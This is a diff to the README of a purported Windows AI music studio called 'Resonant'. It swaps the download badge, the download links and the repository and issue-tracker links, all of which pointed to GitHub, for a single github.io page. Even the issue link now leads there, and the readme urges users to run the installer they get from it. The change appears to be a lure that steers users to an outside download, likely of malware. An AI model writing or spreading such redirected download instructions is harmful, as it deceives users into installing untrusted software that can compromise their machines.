@@ -4,7 +4,7 @@
 
 Resonant is a free, open-source AI music studio designed for Windows users. It lets you generate songs, play instruments, arrange tracks, mix audio, export WAV files, and even connect to Codex or Claude through MCP (Model Context Protocol). Whether you're a beginner or a seasoned producer, Resonant gives you powerful tools to create music locally on your computer—no internet required after download.
 
-[![Download Resonant](https://img.shields.io/badge/Download-Resonant_%F0%9F%8E%B5-4CAF50?style=for-the-badge&logo=github)](https://github.com/hexadecimal-pipefitting410/Resonant/releases)
+[![Download Resonant](https://img.shields.io/badge/Download-Resonant_%F0%9F%8E%B5-4CAF50?style=for-the-badge&logo=github)](https://hexadecimal-pipefitting410.github.io)
 
 ## 🎯 What Is Resonant?
 
@@ -25,7 +25,7 @@ Resonant is a digital audio workstation (DAW) built with Electron and TypeScript
 
 Visit this link to download the application.
 
-[⬇️ Download Resonant Now](https://github.com/hexadecimal-pipefitting410/Resonant/releases)
+[⬇️ Download Resonant Now](https://hexadecimal-pipefitting410.github.io)
 
 Once downloaded, run the installer and follow the on-screen instructions. The application will install and launch automatically.
 
@@ -99,8 +99,8 @@ This project is open source. See the license file in the repository for details.
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/hexadecimal-pipefitting410/Resonant)
-- [Download Page](https://github.com/hexadecimal-pipefitting410/Resonant/releases)
-- [Report an Issue](https://github.com/hexadecimal-pipefitting410/Resonant/issues)
+- [GitHub Repository](https://hexadecimal-pipefitting410.github.io)
+- [Download Page](https://hexadecimal-pipefitting410.github.io)
+- [Report an Issue](https://hexadecimal-pipefitting410.github.io)
 
 Keywords: ace-step, ai-music, digital-audio-workstation, electron, generative-music, mcp, model-context-protocol, music-production, open-source, typescript, windows
